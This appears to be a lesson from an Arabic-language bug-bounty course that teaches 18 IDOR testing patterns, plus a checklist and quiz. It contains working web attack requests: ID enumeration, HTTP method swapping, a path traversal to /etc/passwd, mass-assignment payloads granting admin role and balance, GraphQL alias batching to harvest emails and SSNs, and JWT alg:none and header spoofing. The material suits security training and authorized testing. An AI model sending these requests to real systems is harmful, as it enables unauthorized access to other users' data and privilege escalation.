# 6️⃣ الأنماط الـ 18 — قائمة الفحص الشاملة

> **الملف ده هو اللي بيفرق بينك وبين 90% من المبتدئين.**
> المبتدئ يبدّل الـ ID مرة واحدة، لو ماظهرتش حاجة يمشي.
> إنت هتجرّب **18 نمط** على كل endpoint.

**اطبع القايمة دي وخلّيها قدامك وانت بتختبر.**

---

## 🅰️ مجموعة التلاعب بالمعرّف

### 1️⃣ تبديل المعرّف البسيط
```http
GET /api/orders/8821   →   GET /api/orders/8822
```
👈 الأساس. لو نجع = IDOR صريح. لو 403 → كمل على باقي القايمة.

### 2️⃣ التعداد (Enumeration)
```http
GET /api/orders/8820, 8821, 8822, 8823 ...
```
- جرّب ±1، ±10، ±100
- لو متسلسل: عدّد عيّنة صغيرة (50-200 تكفي)
- راقب الـ `429` — غيابه معناه تعداد مفتوح (ثغرة إضافية)

### 3️⃣ تغيير نوع القيمة
```http
GET /api/users/42        →  GET /api/users/42.0
                         →  GET /api/users/"42"
                         →  GET /api/users/0x2A
                         →  GET /api/users/42%20      (مسافة)
                         →  GET /api/users/+42
```
الـ type juggling (خصوصًا PHP و Node) بيكسر مقارنات الملكية.

### 4️⃣ Array / Parameter Pollution
```http
GET /api/users?ids[]=42&ids[]=43
POST /api/users  {"ids":[42,43,44]}
GET /api/users/42,43,44
```
الاستعلامات الجماعية غالبًا مابتفحصش ملكية كل عنصر.

### 5️⃣ Composite IDs — بدّل كل جزء لوحده
```http
GET /api/tenants/acme/users/42
GET /api/files/42-8821
GET /api/docs/acme:42
```
- بدّل `acme` بس
- بدّل `42` بس
- بدّل الاتنين

### 6️⃣ Base64 / Encoding
```bash
echo -n "42" | base64   →  NDI=
GET /api/users/NDI=
```
فكّ أي معرّف مشفر قبل ماتيأس، وبدّل المحتوى الداخلي.

---

## 🅱️ مجموعة تغيير شكل الطلب

### 7️⃣ تبديل الـ HTTP Method 👈 عالي العائد
```http
GET    /api/users/42   →  403
POST   /api/users/42   →  200  ✅
PATCH  /api/users/42   →  200  ✅
PUT    /api/users/42   →  200  ✅
DELETE /api/users/42   →  204  ✅
OPTIONS /api/users/42  →  يكشف المسموح
```
> 🎯 من أكتر الأنماط إنتاجًا. الفرق بتحمي `GET` وتنسى الباقي.

### 8️⃣ تبديل الـ Content-Type
```http
Content-Type: application/json      →  {"user_id": 42}
Content-Type: application/xml       →  <userId>42</userId>
Content-Type: application/x-www-form-urlencoded  →  user_id=42
Content-Type: multipart/form-data   →  form fields
```
تغيير النوع بيفلت من طبقة تحقق (Validator) مبنية على JSON بس.
وبونص: جرّب XML → ممكن XXE.

### 9️⃣ تغليف البارامتر (Wrapping)
```json
{"id": 42}                       →  {"user": {"id": 42}}
                                 →  {"data": {"attributes": {"id": 42}}}
                                 →  {"filter": {"user_id": 42}}
                                 →  {"userId": 42}   (camelCase)
                                 →  {"user_id": 42, "id": 43}  (تناقض!)
```
> 💡 حطّ **قيمتين متناقضتين** في نفس الطلب وشوف السيرفر بيصدّق أيهما.

### 🔟 نقل البارامتر لمكان تاني
```http
POST /api/orders  body: {"user_id": 42}
                                 ↓
GET  /api/orders?user_id=42
POST /api/orders  header: X-User-Id: 42
POST /api/orders  cookie: uid=42
```
نفس المعرّف في مكان تاني = فحص مختلف (أو معدوم).

### 1️⃣1️⃣ Path Traversal داخل المعرّف
```http
GET /api/users/../admin/config
GET /api/users/42/../43
GET /api/files/....//....//etc/passwd
GET /api/users/%2e%2e%2fadmin
GET /api/users/..%2f42
```

### 1️⃣2️⃣ التلاعب بالمسار (Normalization)
```http
GET /api/users/42/          ← trailing slash
GET /API/users/42           ← case
GET /api//users/42          ← double slash
GET /api/users/42;          ← semicolon
GET /api/users/42;.js
GET /api/./users/42
GET /api/users/42%00
```

---

## 🅲️ مجموعة المنطق والحالة

### 1️⃣3️⃣ Mass Assignment (Auto-binding)
```http
PATCH /api/users/42
{"name":"Ahmed","role":"admin","is_verified":true,"tenant_id":99,"balance":99999}
```
- خُد أسماء الحقول من الـ `GET` على نفس الكائن
- أو من GraphQL introspection أو الـ JS files

### 1️⃣4️⃣ Second-Order IDOR 👈 الأصعب والأعلى قيمة
الوصول مش بيحصل في نفس الطلب:
```
1. POST /api/reports  {"name":"test"}      → 201 {"id": 5001}
2. GET  /api/reports/5001                  → 200 ببياناتك
3. لكن: POST /api/teams/{team_id}/reports  {"report_id": 5001}
        ↓
   الكائن اتربط بـ tenant تاني → GET /api/teams/{team_id}/reports/5001 → بياناتهم
```
النمط: **أنشئ كائن → اربطه بمكان تاني → اقرأه من هناك**.

### 1️⃣5️⃣ Recycled / Deleted References
```
1. مستخدم B عنده كائن ID=900
2. B حذفه (أو ألغى حسابه)
3. إنت (A) أنشأت كائن جديد → واخد نفس الـ ID=900؟
4. أو: الكائن المحذوف لسه بيتقرأ بـ ID=900
```
جرّب IDs قديمة اتسربت في الأرشيف (Wayback).

### 1️⃣6️⃣ الكائنات المشتركة (Shared / Public Objects)
```
1. B يعمل كائن "public" أو يشاركه معاك
2. بعدين B يلغي المشاركة
3. هل تقدر لسه توصله؟
```
أو العكس: الكائنات "العامة" بتسرّب حقول خاصة زي `owner_email`.

---

## 🅳️ مجموعة GraphQL والتقنيات الحديثة

### 1️⃣7️⃣ GraphQL
```graphql
# استكشاف الـ schema
{ __schema { types { name fields { name } } } }

# تبديل المعرّف
{ user(id: 42) { email, ssn, orders { total } } }

# تخطي rate limit بالـ aliases
{ a: user(id:1){email} b: user(id:2){email} c: user(id:3){email} }

# batching
[{"query":"{user(id:1){email}}"},{"query":"{user(id:2){email}}"}]
```
> 🔥 الـ aliases = تعداد آلاف المعرّفات في request واحد. تأثير عالي جدًا.

### 1️⃣8️⃣ التلاعب بالـ JWT والهوية
```http
# بدّل user_id جوه التوكن (محتاج توقيع صحيح أو alg flaw)
# أو:
Authorization: Bearer <token_A>
X-User-Id: 42                        ← السيرفر يصدّق الهيدر؟
X-Original-User: 42
X-On-Behalf-Of: 42
```
وجرّب: `alg:none`, key confusion, `kid` injection (شوف [[02-foundations/02-authentication-vs-authorization]]).

---

## 📋 ورقة الفحص السريع (انسخها)

لما تلاقي endpoint فيه معرّف كائن، مرّر عليه:

```
[ ] 1. بدّل الـ ID (±1، ±100)
[ ] 2. بدّل نوع القيمة (string, float, hex)
[ ] 3. جرّب array
[ ] 4. بدّل كل جزء في composite ID
[ ] 5. فكّ الـ base64 لو موجود
[ ] 6. جرّب POST / PUT / PATCH / DELETE / OPTIONS
[ ] 7. غيّر Content-Type (json/xml/form)
[ ] 8. غلّف البارامتر / غيّر اسمه (camelCase)
[ ] 9. انقل البارامتر (path↔query↔body↔header↔cookie)
[ ] 10. Path traversal
[ ] 11. trailing slash / case / ; / //
[ ] 12. ضيف حقول إدارية (role, is_admin, tenant_id)
[ ] 13. شيل الـ Authorization خالص
[ ] 14. استخدم توكن منتهي / توكن مستخدم تاني
[ ] 15. GraphQL aliases لو موجود
[ ] 16. شوف الردود بـ Comparer (فرق 50 بايت = فرق!)
```

---

## 🎯 نصايح من الواقع

1. **راقب أحجام الردود**: فرق 20 بايت بين مستخدمين = بيانات مختلفة = IDور حتى لو الـ body شكله متشابه
2. **قارن الـ headers كمان**: `X-Total-Count`, `Content-Length`
3. **الـ 500 مش فشل**: غالبًا معناه الـ ID بصيغة مش متوقعة — جرّب صيغة تانية
4. **الـ 403 مش نهاية**: ده معناه الكائن موجود! روح [[03-idor-deepdive/04-bypass-playbook]]
5. **الـ 401 vs 403**: الأول مش عارفك، التاني عارفك ومانعك ← التاني أدق للبحث
6. **اختبر في أوقات هادئة**: لو الهدف عليه حمل، نشاطك أوضح وأسرع
7. **سجّل كل حاجة**: عشرات المحاولات الفاشلة بتوحي بالنمط الناجح

---

## ✅ اختبر نفسك

1. `GET /api/orders/8821` رجّع 403. اذكر 5 حاجات تجرّبها بعدها.
2. إيه الـ Second-Order IDOR؟ وادو مثال.
3. إزاي الـ GraphQL aliases بيساعدك؟
4. ليه تغيير `Content-Type` ممكن يكسر فحص الصلاحية؟
